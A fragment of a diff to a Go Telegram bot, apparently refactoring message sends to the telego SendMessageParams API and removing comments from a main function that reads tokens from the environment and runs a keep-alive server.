 				return
 			}
 			args := strings.Fields(msg.Text)
 			if len(args) < 2 {
-				botr.SendMessage(msg.Chat.ChatID(), "/delsta <code>")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "/delsta <code>",
+				})
 				return
 			}
 			data, sha, _ := getFileContent("sta_info.json")
 			if _, ok := data[args[1]]; !ok {
-				botr.SendMessage(msg.Chat.ChatID(), "မတွေ့ပါ။")
+				botr.SendMessage(&telego.SendMessageParams{
+					ChatID: telego.ChatID{ID: chatID},
+					Text:   "မတွေ့ပါ။",
+				})
 				return
 			}
 			delete(data, args[1])
 			updateFileContent("sta_info.json", data, sha, "Delete STA")
-			botr.SendMessage(msg.Chat.ChatID(), "✅ Deleted")
+			botr.SendMessage(&telego.SendMessageParams{
+				ChatID: telego.ChatID{ID: chatID},
+				Text:   "✅ Deleted",
+			})
 		}
 	})
 }
 
-// ==================== MAIN (24/7 READY) ====================
+// ==================== MAIN ====================
 func main() {
-	// Load config
 	BOT_TOKEN = os.Getenv("BOT_TOKEN")
 	GITHUB_TOKEN = os.Getenv("GITHUB_TOKEN")
 	REPO_OWNER = os.Getenv("REPO_OWNER")
@@ -1155,7 +1377,6 @@ func main() {
 		log.Fatal("BOT_TOKEN env is required")
 	}
 
-	// Start keep-alive web server
 	go func() {
 		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 			w.Write([]byte("Bot is awake and running 24/7!"))
@@ -1166,11 +1387,9 @@ func main() {
 		}
 	}()
 
-	// Start background updaters
 	go successUpdater()
 	go staUpdater()
 
-	// Create bot with panic recovery
 	var b *telego.Bot
 	var err error
 	for i := 0; i < 5; i++ {
@@ -1187,13 +1406,11 @@ func main() {
 
 	registerHandlers(b)
 
-	// Graceful shutdown
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer cancel()
 
 	log.Println("🤖 Bot started! Running 24/7...")
 
-	// Auto-restart polling on error
 	go func() {
 		for {
 			select {
